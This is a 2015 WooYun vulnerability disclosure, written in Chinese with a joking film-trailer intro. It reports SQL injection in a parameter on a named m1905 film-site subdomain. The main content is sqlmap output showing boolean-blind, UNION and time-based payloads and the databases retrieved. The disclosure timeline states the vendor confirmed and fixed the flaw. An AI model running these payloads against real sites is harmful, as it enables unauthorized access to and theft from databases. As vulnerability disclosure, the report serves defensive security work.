wybug_detail:
漏洞详情 披露状态：   									2015-05-12：	细节已通知厂商并且等待厂商处理中									2015-05-16：	厂商已经确认，细节仅向厂商公开									2015-05-16：	厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 大家好，我是本期的光影星播客——90Snake本期为大家推荐的影片是由m1905、90snake领衔主演，由乌云赞助，耗巨资打造的年度悬疑警匪爱情玄幻科幻穿越大片——m1905电影网某处SQL注入 详细说明：  注入点 
http://hd.1905.com/index.php/Content/detail?id=9

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 56 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=9 AND 6148=6148    Type: UNION query    Title: MySQL UNION query (NULL) - 11 columns    Payload: id=-5824 UNION ALL SELECT NULL,CONCAT(0x7170797371,0x5269454d4766694a6469,0x7162776971),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=9 AND SLEEP(5)---[10:47:39] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[10:47:39] [INFO] fetching database names[10:47:39] [INFO] the SQL query used returns 3 entries[10:47:39] [INFO] retrieved: "information_schema"[10:47:39] [INFO] retrieved: "iptv"[10:47:39] [INFO] retrieved: "test"available databases [3]:[*] information_schema[*] iptv[*] test


   漏洞证明：  

   修复方案：  过滤   版权声明：转载请注明来源 90Snake@乌云
